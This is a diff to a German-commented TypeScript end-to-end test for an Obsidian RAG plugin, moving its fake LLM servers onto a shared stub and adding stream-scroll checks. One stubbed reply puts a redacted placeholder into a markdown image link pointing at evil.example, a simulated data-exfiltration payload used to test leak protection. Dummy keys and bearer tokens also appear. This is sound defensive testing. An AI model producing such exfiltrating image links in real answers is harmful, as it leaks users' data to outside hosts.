@@ -41,13 +41,17 @@
  * python3 ~/.claude/hooks/obsidian-cdp-lock.py release
  * ```
  *
- * Der Lauf braucht die Endpunkte der Fixture (Embedding: Ollama `:11434`/`:11435`; Chat: LM Studio `:1234` mit
- * `qwen/qwen3.6-27b`) und schickt echte Anfragen — bei JIT lädt LM Studio das Modell. Fehlt ein Endpunkt, sind die
- * Punkte daran „nichts gemessen“, kein Rot. LM Studio ist geteilt: vorher beim Master anmelden.
+ * **Stub-Lage (seit Welle 20):** Der volle Lauf schickt keine Anfrage an die Fixture-Endpunkte (Ollama `:11434`, LM Studio
+ * `:1234`). Die jeweils erste Zeile beider Listen zeigt auf den zentralen LLM-Stub (`tools/obsidian-cdp/llm-stub.ts`), die
+ * zweite bleibt der tote Fixture-Port; im `finally` stehen die Fixture-Listen wieder da (zuletzt, sonst schreibt eine
+ * mitten im Lauf gesicherte Liste die Stub-Adressen zurück). Zeilenzustände, Schlüssel, Modell-Weg und gesendete Bodys
+ * sind damit messbar. Nicht messbar bleiben, was das ECHTE Embedding-Modell braucht: `search()` und die
+ * Selbstfindung (Anfrage-Vektor des Stubs ist der gespeicherte Vektor einer Notiz, sagt nichts über Semantik) — beide
+ * „nichts gemessen“. Der Index im Staging-Vault entsteht weiterhin nur mit echtem Embedding-Endpunkt (`shots --prepare`).
  *
- * `--only w15,w16` fährt nur die Schlüsselbund-Sektionen (Welle 15/16): beide laufen gegen eigene Fake-Server auf der
- * Node-Seite und schicken nichts an :1234/:11434. Die Soll-Liste ist dann ihre Teilmenge (Exit 0 bei grün); alle
- * anderen Sektionen laufen nicht und stehen nicht im Nenner. Ein Gesamtlauf bleibt der Beleg für den Rest.
+ * `--only w15,w16` fährt nur die Schlüsselbund-Sektionen (Welle 15/16): beide laufen gegen eigene Stub-Instanzen
+ * und schicken nichts an :1234/:11434. Die Soll-Liste ist dann ihre Teilmenge (Exit 0 bei grün); alle
+ * anderen Sektionen laufen nicht und stehen nicht im Nenner. Die Stub-Lage gilt nur im vollen Lauf.
  *
  * `--vault` ist optional (Default `vault-rag`, der Staging-Vault) und matcht exakt gegen `app.vault.getName()`.
  *
@@ -78,9 +82,9 @@
 import { existsSync, readFileSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { cwd } from "node:process";
-import { createServer, type Server } from "node:http";
 
-import { Cdp, attachTo, bereiteInstanzVor, pollUntil, requireVisible } from "../../tools/obsidian-cdp/cdp.js";
+import { Cdp, attachTo, bereiteInstanzVor, entferneFakeManager, fakeManagerAufrufe, installFakeManager, pollUntil, requireVisible } from "../../tools/obsidian-cdp/cdp.js";
+import { startLlmStub } from "../../tools/obsidian-cdp/llm-stub.js";
 import { createBilanz, parseArgs, runDriver, type Bilanz } from "../../tools/obsidian-cdp/bilanz.js";
 import { requireEigenerBuild } from "../../tools/obsidian-cdp/vault.js";
 import { capture } from "../../tools/obsidian-cdp/shot.js";
@@ -160,6 +164,18 @@ const W16_PUNKTE = [
   "Schlüsselbund (Embedding) mit installiertem Manager: die Migration läuft beim Laden trotzdem",
 ];
 
+/** Stream-Bereiche (Welle 20): die Folge-Regel (Kit `buildStreamArea`, `followTail`) und der Denkblock im Strom. Smart Apply
+ *  scrollt im Bereich selbst (Höhe auf 220 px begrenzt), das Umformulieren-Modal über `contentEl`; das Modal zeigt kein
+ *  Reasoning (`stream` kennt nur `onToken`), dort ist „Denkblock live“ in dieser Lage nicht anwendbar. */
+const STREAM_PUNKTE = {
+  saKontrolle: "Smart Apply: der Stream-Bereich folgt dem Strom ohne Störung (Kontrolle)",
+  saFolge: "Smart Apply: Hochscrollen mitten im Strom wird respektiert (Folge-Regel)",
+  saDenk: "Smart Apply: der Denkblock ist während des Stroms sichtbar und wächst (Denkblock live)",
+  rfKontrolle: "Umformulieren: der Ergebnisbereich folgt dem Strom ohne Störung (Kontrolle)",
+  rfFolge: "Umformulieren: Hochscrollen mitten im Strom wird respektiert (Folge-Regel)",
+  rfDenk: "Umformulieren: der Denkblock ist während des Stroms sichtbar und wächst (Denkblock live)",
+} as const;
+
 const POPOUT_PUNKT = "Der Index-Ordner wird im Hauptfenster ausgeblendet, auch wenn beim Laden ein Pop-out aktiv ist";
 
   const PUNKT_TREU = "Umformulieren: zum Modell gehen nur Platzhalter, ein Ergebnis mit allen Links bleibt anwendbar";
@@ -226,6 +242,7 @@ const PUNKTE = [
   PUNKT_SPERRE,
   PUNKT_UMBRUCH,
   ...Object.values(W7I),
+  ...Object.values(STREAM_PUNKTE),
 ] as const;
 
 // --- Prüfpunkte -------------------------------------------------------------
@@ -246,6 +263,65 @@ let bilanz: Bilanz = createBilanz({ punkte: PUNKTE });
  *  schicken nichts an die Fixture-Endpunkte (:1234/:11434). Alles andere ist der Rest (ohne `--only`). */
 const NUR_SEKTIONEN = { w15: W15_PUNKTE, w16: W16_PUNKTE } as const;
 type NurSektion = keyof typeof NUR_SEKTIONEN;
+
+type StubHandle = Awaited<ReturnType<typeof startLlmStub>>;
+interface FolgeErgebnis { art: "ok" | "rot" | "ungueltig"; detail: string }
+
+/** Folge-Regel eines Stream-Bereichs, in einem Strom: erst die KONTROLLE (ohne Störung folgt der Bereich dem Strom), dann
+ *  die STÖRUNG (`scrollTop = 0` mitten im Strom wird respektiert, der Bereich springt nicht wieder nach unten).
+ *  Gültigkeit (CORE-TEST-22): der Überlauf des scrollenden Elements ist bei der Messung ≥ 80 px (Folge-Schwelle 40 px plus 40 px
+ *  Spielraum), der Strom läuft bei der letzten Ablesung noch (`unterwegs > 0`) und der Text ist seit der Störung um mindestens
+ *  drei Stücke gewachsen. Sonst „ungültig“, nie grün. Stücke tokengroß (8 Zeichen) und kurzer Takt: absatzgroße Stücke
+ *  messen die Stückgröße statt den Bereich (Kit-Befund kuro-w20, Rundschreiben 3). */
+async function messeFolge(cdp: Cdp, scrollSel: string, stub: StubHandle): Promise<{ kontrolle: FolgeErgebnis; folge: FolgeErgebnis }> {
+  const lies = `const el = document.querySelector(${JSON.stringify(scrollSel)}); if (!el) return null;
+    return { top: el.scrollTop, hoehe: el.scrollHeight, sicht: el.clientHeight, laenge: (el.textContent || "").length };`;
+  type M = { top: number; hoehe: number; sicht: number; laenge: number } | null;
+  const ungueltig = (grund: string): { kontrolle: FolgeErgebnis; folge: FolgeErgebnis } =>
+    ({ kontrolle: { art: "ungueltig", detail: grund }, folge: { art: "ungueltig", detail: grund } });
+  const voll = await pollUntil<NonNullable<M>>(cdp, `const m = (() => { ${lies} })(); return m && m.hoehe - m.sicht >= 80 ? m : null;`, 40_000, 100);
+  if (!voll) return ungueltig(`der Überlauf von ${scrollSel} erreichte in 40 s nie 80 px — Gültigkeitsbedingung nicht hergestellt`);
+  const lesen = (): Promise<M> => cdp.evaluate<M>(lies);
+  const proben: NonNullable<M>[] = [voll];
+  for (let i = 0; i < 2; i++) {
+    await new Promise((r) => setTimeout(r, 400));
+    const m = await lesen();
+    if (m) proben.push(m);
+  }
+  const letzte = proben[proben.length - 1]!;
+  const gewachsen = letzte.laenge > voll.laenge && letzte.hoehe > voll.hoehe;
+  const laeuft = stub.zaehler().unterwegs > 0;
+  const abstaende = proben.map((m) => Math.round(m.hoehe - m.top - m.sicht));
+  let kontrolle: FolgeErgebnis;
+  if (!gewachsen || !laeuft) kontrolle = { art: "ungueltig", detail: `Strom wuchs nicht (Text ${voll.laenge} → ${letzte.laenge}, Höhe ${voll.hoehe} → ${letzte.hoehe}) oder lief nicht mehr (unterwegs ${stub.zaehler().unterwegs})` };
+  else {
+    const ok = abstaende.every((d) => d <= 24);
+    kontrolle = { art: ok ? "ok" : "rot", detail: `Abstand zum Ende ${abstaende.join(" / ")} px (≤ 24), Text ${voll.laenge} → ${letzte.laenge} Zeichen, Überlauf ${Math.round(voll.hoehe - voll.sicht)} px` };
+  }
+  // Störung: nach oben scrollen und auf mindestens drei weitere Stücke warten.
+  const z0 = await cdp.evaluate<{ top: number; laenge: number; ueberlauf: number } | null>(`
+    const el = document.querySelector(${JSON.stringify(scrollSel)}); if (!el) return null;
+    el.scrollTop = 0;
+    return { top: el.scrollTop, laenge: (el.textContent || "").length, ueberlauf: el.scrollHeight - el.clientHeight };`);
+  if (!z0) return { kontrolle, folge: { art: "ungueltig", detail: "Scroll-Element verschwunden" } };
+  const danach = await pollUntil<NonNullable<M>>(cdp, `const m = (() => { ${lies} })(); return m && m.laenge >= ${z0.laenge + 24} ? m : null;`, 4_000, 100);
+  const nochDa = stub.zaehler().unterwegs > 0;
+  let folge: FolgeErgebnis;
+  if (z0.ueberlauf < 80) folge = { art: "ungueltig", detail: `Überlauf bei der Störung nur ${Math.round(z0.ueberlauf)} px (< 80)` };
+  else if (!danach || !nochDa) folge = { art: "ungueltig", detail: `nach der Störung kamen keine drei weiteren Stücke oder der Strom war zu Ende (unterwegs ${stub.zaehler().unterwegs})` };
+  else {
+    const ok = danach.top <= z0.top + 4;
+    folge = { art: ok ? "ok" : "rot", detail: `scrollTop zur Störung ${Math.round(z0.top)} → ${Math.round(danach.top)} nach ${danach.laenge - z0.laenge} weiteren Zeichen, Überlauf ${Math.round(z0.ueberlauf)} px` };
+  }
+  return { kontrolle, folge };
+}
+
+function zeichneFolge(namen: { kontrolle: string; folge: string }, r: { kontrolle: FolgeErgebnis; folge: FolgeErgebnis }): void {
+  for (const [name, e] of [[namen.kontrolle, r.kontrolle], [namen.folge, r.folge]] as const) {
+    if (e.art === "ungueltig") unmeasured(name, `Messung ungültig: ${e.detail}`);
+    else record(name, e.art === "ok", e.detail);
+  }
+}
 
 /** `--only w15,w16` → Menge der Sektionen; `null` ohne Flag (voller Lauf). Unbekannte Namen brechen ab. */
 function parseNur(roh: string | undefined): Set<NurSektion> | null {
@@ -269,6 +345,11 @@ function record(name: string, passed: boolean, detail: string): void {
  *  anwendbar“ — gibt es hier keinen Fall: der vorgesehene Ort ist der Staging-Vault mit Fixture.) */
 function unmeasured(name: string, reason: string): void {
   bilanz.unmeasured(name as (typeof PUNKTE)[number], reason);
+}
+
+/** In dieser Lage nicht anwendbar (CORE-TEST-19) — mit Grund; kein „nichts gemessen“, weil der Gegenstand fehlt. */
+function skipped(name: string, reason: string): void {
+  bilanz.skipped(name as (typeof PUNKTE)[number], reason);
 }
 
 /** Liest die sichtbaren Endpunkt-Zeilen der zuletzt geöffneten Einstellungs-Seite. */
@@ -421,6 +502,9 @@ async function main(): Promise<void> {
   // Das Lab-Stub haengt im Renderer und muss auch nach einem Abbruch mitten im Lauf weg —
   // sonst glaubt ein spaeter installiertes echtes Lab, es sei bereits registriert.
   let labStubbed = false;
+  // Stub-Lage des vollen Laufs: der Stub und die gesicherten Fixture-Listen, im finally zurueckgeschrieben.
+  let stubLage: Awaited<ReturnType<typeof startLlmStub>> | null = null;
+  let stubLageSaved: { emb: unknown; chat: unknown } | null = null;
 
   // Ein Ctrl-C mitten im Lauf ueberspringt das `finally` unten NICHT im try/catch-Sinn, sondern
   // beendet den Node-Prozess sofort — ohne eigenen Handler laueft das anhaengige `await` nie zu
@@ -534,6 +618,46 @@ async function main(): Promise<void> {
     const isChecking = (state: string | null): boolean => state === L.checking || state === LK.checking;
     console.log(`  (Oberflächensprache: ${uiLang} — Embedding „${L.active}" / „${L.unreachable}", Chat (Kit) „${LK.active}" / „${LK.unreachable}")\n`);
 
+    // Stub-Lage (Welle 20, B1): Der volle Lauf schickt NIE eine Anfrage an die Fixture-Endpunkte (:1234/:11434, LM-Regel).
+    // Die jeweils erste Zeile beider Listen zeigt auf den zentralen LLM-Stub, die zweite bleibt der tote Port der Fixture
+    // (:11435/:1235). Dadurch sind Zeilenzustaende, Schluessel, Modell-Weg und Anfrage-Koerper messbar; was das ECHTE
+    // Modell braucht (Anfrage-Vektoren des Index), bleibt "nichts gemessen" mit diesem Grund.
+    if (!nur) {
+      const modelle = await main.evaluate<{ emb: string; chat: string }>(`
+        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+        return { emb: p.settings.embeddingEndpoints[0]?.model || "", chat: p.settings.chatEndpoints[0]?.model || "" };
+      `);
+      // Anfrage-Vektor des Stubs: der gespeicherte Vektor EINER indexierten Notiz (dieselbe Dimension, gleiche Normierung),
+      // damit die Kontextsuche des Chats Treffer hat. Mit einem Phantasie-Vektor fände sie keine, und der Chat-Punkt
+      // würde am Stub rot statt am Plugin. Er sagt nichts über die Semantik (siehe die beiden Punkte mit Anfrage-Vektor).
+      const stubVektor = await main.evaluate<number[] | null>(`
+        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+        const f = p.index ? app.vault.getMarkdownFiles().find((x) => p.index.vectorFor(x.path)) : null;
+        return f ? Array.from(p.index.vectorFor(f.path)) : null;
+      `);
+      stubLage = await startLlmStub({
+        models: [modelle.emb, modelle.chat].filter((m) => m !== ""),
+        embeddings: { vektor: stubVektor ?? Array.from({ length: 256 }, () => 0.0625) },
+        lmStudioV1: true,
+      });
+      stubLageSaved = await main.evaluate<{ emb: unknown; chat: unknown }>(`
+        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+        const gesichert = { emb: JSON.parse(JSON.stringify(p.settings.embeddingEndpoints)), chat: JSON.parse(JSON.stringify(p.settings.chatEndpoints)) };
+        if (p.settings.embeddingEndpoints[0]) p.settings.embeddingEndpoints[0].url = ${JSON.stringify(stubLage.url)};
+        if (p.settings.chatEndpoints[0]) {
+          p.settings.chatEndpoints[0].url = ${JSON.stringify(stubLage.url)};
+          // Ein Schluessel an der Chat-Zeile 1: erst damit tragen die Zeilen das Schluessel-Icon (Punkt "Warn-/Schluessel-Icons").
+          // Er wandert beim Aufloesen in den Schluesselbund und wird im finally dort geleert; die Fixture-Datei bekommt ihn nie zurueck.
+          p.settings.chatEndpoints[0].apiKey = "stub-lage-schluessel";
+        }
+        await p.saveSettings();
+        await p.resolveAndReconnectChat();
+        await p.resolveAndReconnectEmbedder();
+        return gesichert;
+      `);
+      console.log(`  (Stub-Lage: beide Listen zeigen mit Zeile 1 auf ${stubLage.url}, Zeile 2 bleibt der tote Fixture-Port)\n`);
+    }
+
     const MGR = "llm-endpoint-manager";
     const MGR_MODEL = "w8-manager-modell";
     const MGR_EMB_MODEL = "w8-fremdes-embedding-modell";
@@ -604,7 +728,9 @@ async function main(): Promise<void> {
     // Falle 16 der REGISTRY: ein Prüfpunkt, der nur den Fehlerfall anfasst, beweist nichts.
     // search() braucht den Embedding-Endpunkt — ist er tot, ist "offline" die RICHTIGE
     // Antwort und kein Befund. Dann übersprungen statt falsch-grün oder falsch-rot.
-    if (probe.search?.ok) {
+    if (stubLage) {
+      unmeasured("search() liefert semantische Treffer", "Stub-Lage: der Anfrage-Vektor kommt vom Stub, nicht vom Embedding-Modell (LM-Regel) — Treffer sagen nichts über die Semantik");
+    } else if (probe.search?.ok) {
       record("search() liefert semantische Treffer", (probe.search.hits?.length ?? 0) > 0,
         `${probe.search.hits?.length ?? 0} Treffer`);
     } else if (probe.search?.reason === "offline") {
@@ -669,7 +795,9 @@ async function main(): Promise<void> {
       `return window.__vaultRagSelfFind;`, 240_000, 2_000)
       ?? { present: true, tried: [], offline: false, error: "Probe nach 240 s ohne Ergebnis — Embedding-Endpunkt unter Last?" };
 
-    if (selfFind.error) {
+    if (stubLage) {
+      unmeasured("Notizen finden sich ueber ihren eigenen Wortlaut", "Stub-Lage: der Anfrage-Vektor kommt vom Stub, nicht vom Embedding-Modell (LM-Regel) — Rang 0 ist nur mit dem echten Modell zu belegen");
+    } else if (selfFind.error) {
       record("Notizen finden sich ueber ihren eigenen Wortlaut", false, selfFind.error);
     } else if (!selfFind.present) {
       record("Notizen finden sich ueber ihren eigenen Wortlaut", false, "Plugin-API nicht erreichbar");
@@ -1605,26 +1733,25 @@ async function main(): Promise<void> {
         return { chatUrl: p.settings.chatEndpoints[0].url, embUrl: p.settings.embeddingEndpoints[0].url, chatModel: p.settings.chatEndpoints[0].model || "" };
       `);
       try {
+        // Fake-Manager aus der zentralen Brücke: beide Rollen, `config.model` = Standardmodell (wie der echte Manager,
+        // lingotuner-Fund C1), der Schlüssel kommt in `resolve().config.apiKey` zurück; `caller` im Aufrufmitschnitt.
+        await installFakeManager(main, {
+          pluginId: MGR,
+          endpunkte: [
+            { id: "w8-chat", label: "w8-chat", url: mgrLocal.chatUrl, models: [MGR_MODEL], defaultModel: MGR_MODEL, capabilities: ["chat"], apiKey: "w8-schluessel", configModel: "default" },
+            { id: "w8-embedding", label: "w8-embedding", url: mgrLocal.embUrl, models: [MGR_EMB_MODEL], defaultModel: MGR_EMB_MODEL, capabilities: ["embedding"], apiKey: "w8-schluessel", configModel: "default" },
+          ],
+        });
         const m1 = await main.evaluate<Record<string, unknown>>(`
           const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-          window.__vrMgrCalls = [];
-          const ep = (cap, url, model) => ({ id: "w8-" + cap, label: "w8-" + cap, config: { url, model, apiKey: "w8-schluessel" }, defaultModel: model });
-          const epChat = ep("chat", ${JSON.stringify(mgrLocal.chatUrl)}, ${JSON.stringify(MGR_MODEL)});
-          const epEmb = ep("embedding", ${JSON.stringify(mgrLocal.embUrl)}, ${JSON.stringify(MGR_EMB_MODEL)});
-          app.plugins.plugins[${JSON.stringify(MGR)}] = { api: {
-            version: 1, list: () => [], get: () => null,
-            resolve: async (cap, o) => { window.__vrMgrCalls.push(cap + ":" + (o && o.caller)); return cap === "embedding" ? epEmb : epChat; },
-            materialize: async () => ({ error: "not-found" }), models: async () => [],
-            importEndpoints: async () => ({ added: [], merged: [], skipped: [] }), on: () => () => {},
-          } };
           await p.resolveAndReconnectChat();
           await p.resolveAndReconnectEmbedder();
           return {
             key: ((await p.llm.resolve()).config || {}).apiKey, model: p.chatModelInUse, active: p.activeChatEndpoint,
-            calls: window.__vrMgrCalls.join(","),
             embModel: p.embeddingModelInUse, embActive: p.activeEmbeddingEndpoint,
           };
         `);
+        (m1 as Record<string, unknown>).calls = (await fakeManagerAufrufe(main)).map((a) => `${a.arg}:${String(a.caller)}`).join(",");
         record(MGR_PUNKTE[0]!,
           m1.key === "w8-schluessel" && m1.model === MGR_MODEL && String(m1.calls).includes("chat:vault-retrieval"),
           `Modell ${String(m1.model)} · Schlüssel ${m1.key === "w8-schluessel" ? "vom Manager" : String(m1.key)} · Aufrufe ${String(m1.calls)}`);
@@ -1668,11 +1795,10 @@ async function main(): Promise<void> {
       } finally {
         await main.evaluate(`
           const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-          delete app.plugins.plugins[${JSON.stringify(MGR)}];
-          delete window.__vrMgrCalls;
           p.settings.chatChoice = {}; p.settings.embeddingChoice = {};
           await p.saveSettings();
         `);
+        await entferneFakeManager(main, { pluginId: MGR });
       }
       const m5 = await main.evaluate<Record<string, unknown>>(`
         const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
@@ -1697,25 +1823,19 @@ async function main(): Promise<void> {
     if (laeuft("w15")) {
       const W15_KEY = "w15-schluessel-geheim";
       const W15_TOKEN = "Bearer abcdefghijklmnopqrstuvwxyz0123456789";
-      const seen: { auth: string | undefined; body: string }[] = [];
       let mode: "plain" | "image" = "plain";
-      const srv: Server = createServer((req, res) => {
-        const cors = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "authorization, content-type", "Access-Control-Allow-Methods": "GET, POST, OPTIONS" };
-        if (req.method === "OPTIONS") { res.writeHead(204, cors); res.end(); return; }
-        if (req.method === "GET") { res.writeHead(200, { ...cors, "Content-Type": "application/json" }); res.end(JSON.stringify({ data: [{ id: "fake-model" }] })); return; }
-        let body = "";
-        req.on("data", (c: Buffer) => { body += c.toString(); });
-        req.on("end", () => {
-          seen.push({ auth: req.headers.authorization, body });
-          const ph = /\[redacted-[a-z0-9-]+-\d+\]/.exec(body)?.[0] ?? "KEIN-PLATZHALTER";
-          const text = mode === "image" ? `Siehe ![x](https://evil.example/?d=${ph}) hier` : `Zitat: ${ph} gewesen`;
-          res.writeHead(200, { ...cors, "Content-Type": "text/event-stream" });
-          res.end(`data: ${JSON.stringify({ choices: [{ delta: { content: text }, finish_reason: "stop" }] })}\n\ndata: [DONE]\n\n`);
-        });
+      // Zentraler Stub statt eigenem Server: spiegelt den Platzhalter der Anfrage in seine Antwort. Preflight/CORS, Modell-GET
+      // und SSE kommen vom Stub (Pfade streng: nur /v1/models und /v1/chat/completions).
+      const stub15 = await startLlmStub({
+        models: ["fake-model"],
+        antwort: (anfrage) => {
+          const ph = /\[redacted-[a-z0-9-]+-\d+\]/.exec(anfrage.body)?.[0] ?? "KEIN-PLATZHALTER";
+          return mode === "image" ? `Siehe ![x](https://evil.example/?d=${ph}) hier` : `Zitat: ${ph} gewesen`;
+        },
       });
-      await new Promise<void>((r) => srv.listen(0, "127.0.0.1", r));
-      const addr = srv.address();
-      const url = `http://127.0.0.1:${typeof addr === "object" && addr ? addr.port : 0}`;
+      const seen = (): { auth: string | undefined; body: string }[] =>
+        stub15.anfragen().filter((a) => a.route === "chat").map((a) => ({ auth: typeof a.header.authorization === "string" ? a.header.authorization : undefined, body: a.body }));
+      const url = stub15.url;
       const saved = await main.evaluate<unknown>(`return JSON.parse(JSON.stringify(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.chatEndpoints));`);
       try {
         const n1 = await main.evaluate<Record<string, unknown>>(`
@@ -1755,7 +1875,8 @@ async function main(): Promise<void> {
           const r = await p.chatClient.stream([{ role: "user", content: "Der Zugang ist ${W15_TOKEN} ok." }], () => {}, () => {});
           return { content: r.content };
         `);
-        const first = seen[seen.length - 1];
+        const alle15 = seen();
+        const first = alle15[alle15.length - 1];
         record(W15_PUNKTE[2]!, first?.auth === `Bearer ${W15_KEY}`, `Authorization: ${first?.auth === `Bearer ${W15_KEY}` ? "Bearer <Schlüssel aus dem Schlüsselbund>" : String(first?.auth)}`);
         record(W15_PUNKTE[3]!,
           !!first && !first.body.includes("abcdefghijklmnopqrstuvwxyz0123456789") && /\[redacted-/.test(first.body)
@@ -1821,7 +1942,7 @@ async function main(): Promise<void> {
           p.llm.invalidate();
           await p.resolveAndReconnectChat();
         `);
-        await new Promise<void>((r) => srv.close(() => r()));
+        await stub15.stop();
       }
     }
 
@@ -1835,21 +1956,10 @@ async function main(): Promise<void> {
     if (laeuft("w16")) {
       const W16_KEY = "w16-embedding-schluessel";
       const W16_CHAT_KEY = "w16-chat-schluessel";
-      const seen16: { method: string; auth: string | undefined }[] = [];
-      const srv16: Server = createServer((req, res) => {
-        const cors = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "authorization, content-type", "Access-Control-Allow-Methods": "GET, POST, OPTIONS" };
-        if (req.method === "OPTIONS") { res.writeHead(204, cors); res.end(); return; }
-        seen16.push({ method: req.method ?? "", auth: req.headers.authorization });
-        if (req.method === "GET") { res.writeHead(200, { ...cors, "Content-Type": "application/json" }); res.end(JSON.stringify({ data: [{ id: "qwen3-embedding:8b" }, { id: "fake-model" }] })); return; }
-        req.on("data", () => undefined);
-        req.on("end", () => {
-          res.writeHead(200, { ...cors, "Content-Type": "application/json" });
-          res.end(JSON.stringify({ data: [{ embedding: [0.1, 0.2, 0.3] }] }));
-        });
-      });
-      await new Promise<void>((r) => srv16.listen(0, "127.0.0.1", r));
-      const addr16 = srv16.address();
-      const url16 = `http://127.0.0.1:${typeof addr16 === "object" && addr16 ? addr16.port : 0}`;
+      const stub16 = await startLlmStub({ models: ["qwen3-embedding:8b", "fake-model"], embeddings: { vektor: [0.1, 0.2, 0.3] } });
+      const seen16 = (): { method: string; auth: string | undefined }[] =>
+        stub16.anfragen().map((a) => ({ method: a.methode, auth: typeof a.header.authorization === "string" ? a.header.authorization : undefined }));
+      const url16 = stub16.url;
       const saved16 = await main.evaluate<{ emb: unknown; chat: unknown }>(`
         const s = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings;
         return { emb: JSON.parse(JSON.stringify(s.embeddingEndpoints)), chat: JSON.parse(JSON.stringify(s.chatEndpoints)) };
@@ -1891,21 +2001,21 @@ async function main(): Promise<void> {
             !!r3.embSecret && !r3.embPlain && r3.leakEmb === false && r3.embedderKey === W16_KEY && r2.embedderKey === W16_KEY,
             `Neustart 2: Schlüssel im Embedder ${r2.embedderKey === W16_KEY ? "da" : "FEHLT"} · Neustart 3: secretId ${r3.embSecret ? "da" : "WEG"}, Schlüssel im Embedder ${r3.embedderKey === W16_KEY ? "da" : "FEHLT"}`);
 
-          seen16.length = 0;
+          stub16.loescheMitschnitt();
           await main.evaluate(`
             const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
             await p.resolveAndReconnectEmbedder();
             await p.emb.embedder().embed(["probe"]);
             return true;
           `);
-          const gets = seen16.filter((x) => x.method === "GET");
-          const posts = seen16.filter((x) => x.method === "POST");
+          const gets = seen16().filter((x) => x.method === "GET");
+          const posts = seen16().filter((x) => x.method === "POST");
           const want = `Bearer ${W16_KEY}`;
           record(W16_PUNKTE[2]!,
             gets.length > 0 && posts.length > 0 && gets.every((x) => x.auth === want) && posts.every((x) => x.auth === want),
             `Probe ${gets.length}× ${gets.every((x) => x.auth === want) ? "mit Bearer" : "OHNE Bearer"} · embed ${posts.length}× ${posts.every((x) => x.auth === want) ? "mit Bearer" : "OHNE Bearer"}`);
 
-          seen16.length = 0;
+          stub16.loescheMitschnitt();
           await main.evaluate(`
             const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
             const raw = p.settings.embeddingEndpoints[0];
@@ -1915,29 +2025,23 @@ async function main(): Promise<void> {
             await fetch(raw.url + "/v1/embeddings", { method: "POST", headers: { "Content-Type": "application/json", ...h }, body: JSON.stringify({ model: raw.model, input: ["probe"] }) });
             return true;
           `);
-          record(W16_PUNKTE[3]!, seen16.length >= 2 && seen16.every((x) => x.auth === undefined),
-            `${seen16.length} Anfragen aus der nicht hydrierten Zeile · Bearer ${seen16.every((x) => x.auth === undefined) ? "keiner (richtig)" : "VORHANDEN (Gegenprobe taugt nicht)"}`);
+          record(W16_PUNKTE[3]!, seen16().length >= 2 && seen16().every((x) => x.auth === undefined),
+            `${seen16().length} Anfragen aus der nicht hydrierten Zeile · Bearer ${seen16().every((x) => x.auth === undefined) ? "keiner (richtig)" : "VORHANDEN (Gegenprobe taugt nicht)"}`);
 
           // Mit Manager: weder Kit-Resolver noch Listen-UI migrieren dann.
           if (!(await setPlain())) {
             unmeasured(W16_PUNKTE[4]!, "Klartext-Zustand nicht herstellbar");
           } else {
-            await main.evaluate(`
-              app.plugins.plugins[${JSON.stringify(MGR)}] = { api: {
-                version: 1, list: () => [], get: () => null, resolve: async () => null,
-                materialize: async () => ({ error: "not-found" }), models: async () => [],
-                importEndpoints: async () => ({ added: [], merged: [], skipped: [] }), on: () => () => {},
-              } };
-              return true;
-            `);
+            // Ein Manager ohne Endpunkte: er ist installiert (die Migration darf deshalb nicht ausfallen), liefert aber nichts.
+            await installFakeManager(main, { pluginId: MGR, endpunkte: [] });
             const rm = await reload();
             record(W16_PUNKTE[4]!, rm.leakEmb === false && rm.leakChat === false && !!rm.embSecret && !!rm.chatSecret,
               `Leck Embedding=${String(rm.leakEmb)} Chat=${String(rm.leakChat)} · secretId Embedding=${String(rm.embSecret)} Chat=${String(rm.chatSecret)}`);
           }
         }
       } finally {
+        await entferneFakeManager(main, { pluginId: MGR });
         await main.evaluate(`
-          delete app.plugins.plugins[${JSON.stringify(MGR)}];
           const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
           for (const l of [p.settings.embeddingEndpoints, p.settings.chatEndpoints]) {
             for (const cur of l) if (cur && cur.secretId) app.secretStorage.setSecret(cur.secretId, "");
@@ -1950,7 +2054,7 @@ async function main(): Promise<void> {
           await p.resolveAndReconnectEmbedder();
           return true;
         `);
-        await new Promise<void>((r) => srv16.close(() => r()));
+        await stub16.stop();
       }
     }
 
@@ -2443,6 +2547,127 @@ async function main(): Promise<void> {
       }
     }
 
+    // --- 7j. Stream-Bereiche (Welle 20): Folge-Regel und Denkblock im Strom ---------------------
+    // Gegen den zentralen Stub der Stub-Lage: tokengroße Stücke (8 Zeichen) im kurzen Takt, der Strom hält danach offen
+    // (`nachlaufMs`), damit die Messung nie am Schluss-Draw liegt. Smart Apply streamt mit Reasoning in einen Bereich mit
+    // eigener Höhe (220 px, scrollt selbst); das Umformulieren-Modal hat kein Reasoning und scrollt über `contentEl`.
+    {
+      const N = STREAM_PUNKTE;
+      if (!stubLage) {
+        for (const n of Object.values(N)) unmeasured(n, "Stub-Lage nicht hergestellt — nichts gemessen");
+      } else {
+        const stub = stubLage;
+        const zeilen = (k: number): string => Array.from({ length: k }, (_, i) => `Zeile ${String(i + 1).padStart(3, "0")}: abcdefghij klmnopqrs\n`).join("");
+        const denken = "Ich ordne die Abschnitte der Vorlage zu und prüfe ihre Reihenfolge. ".repeat(10);
+        // --- Smart Apply -----------------------------------------------------------------------------
+        let saWas = false;
+        try {
+          stub.antworten([{ reasoning: denken, text: zeilen(120), laenge: 8, takt: 40, nachlaufMs: 6000 }]);
+          await main.evaluate(`
+            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+            window.__w20SmartWas = !!p.settings.smartApplyEnabled;
+            p.settings.smartApplyEnabled = true; await p.saveSettings();
+            await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
+            await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
+            return true;`);
+          saWas = true;
+          await pollUntil(main, `return !!app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]?.api?.status().indexed;`, 30_000, 500).catch(() => false);
+          const gestartet = await main.evaluate<boolean>(`
